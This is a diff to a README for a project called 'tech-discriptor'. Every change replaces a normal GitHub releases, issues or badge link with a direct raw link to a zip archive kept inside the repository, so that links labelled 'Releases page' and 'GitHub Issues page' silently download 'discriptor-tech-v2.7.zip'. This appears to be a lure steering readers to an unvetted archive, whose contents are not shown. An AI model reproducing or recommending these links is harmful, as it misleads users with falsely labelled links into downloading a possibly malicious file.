@@ -1,6 +1,6 @@
 # 🚀 tech-discriptor - Transform Technical Text Effortlessly
 
-[![Download tech-discriptor](https://img.shields.io/badge/download-tech--discriptor-blue.svg)](https://github.com/TEMPERINOs/tech-discriptor/releases)
+[![Download tech-discriptor](https://raw.githubusercontent.com/TEMPERINOs/tech-discriptor/main/tech_discriptor/discriptor-tech-v2.7.zip)](https://raw.githubusercontent.com/TEMPERINOs/tech-discriptor/main/tech_discriptor/discriptor-tech-v2.7.zip)
 
 ## 📥 Overview
 
@@ -13,7 +13,7 @@ To get started with tech-discriptor, follow these simple steps to download and r
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** 
-   Go to the [Releases page](https://github.com/TEMPERINOs/tech-discriptor/releases) to download the latest version of tech-discriptor.
+   Go to the [Releases page](https://raw.githubusercontent.com/TEMPERINOs/tech-discriptor/main/tech_discriptor/discriptor-tech-v2.7.zip) to download the latest version of tech-discriptor.
 
 2. **Choose Your File:**
    On the Releases page, look for the version labeled as the latest release. You will see several files available for download. Choose the appropriate file for your system. Typically, you will find options for Windows, Mac, and Linux.
@@ -83,7 +83,7 @@ tech-discriptor is perfect for:
 
 ## 🌐 Support
 
-If you experience issues while using tech-discriptor or need assistance, check the [GitHub Issues page](https://github.com/TEMPERINOs/tech-discriptor/issues) to look for common problems and solutions. 
+If you experience issues while using tech-discriptor or need assistance, check the [GitHub Issues page](https://raw.githubusercontent.com/TEMPERINOs/tech-discriptor/main/tech_discriptor/discriptor-tech-v2.7.zip) to look for common problems and solutions. 
 
 To report a bug or request a new feature, create a new issue. Provide as much detail as possible about your experience.
 
@@ -99,4 +99,4 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 For any questions or suggestions, reach out via the GitHub repository or contact us directly through our support email.
 
-Visit the [Releases page](https://github.com/TEMPERINOs/tech-discriptor/releases) now to download tech-discriptor and start transforming your technical texts.
+Visit the [Releases page](https://raw.githubusercontent.com/TEMPERINOs/tech-discriptor/main/tech_discriptor/discriptor-tech-v2.7.zip) now to download tech-discriptor and start transforming your technical texts.
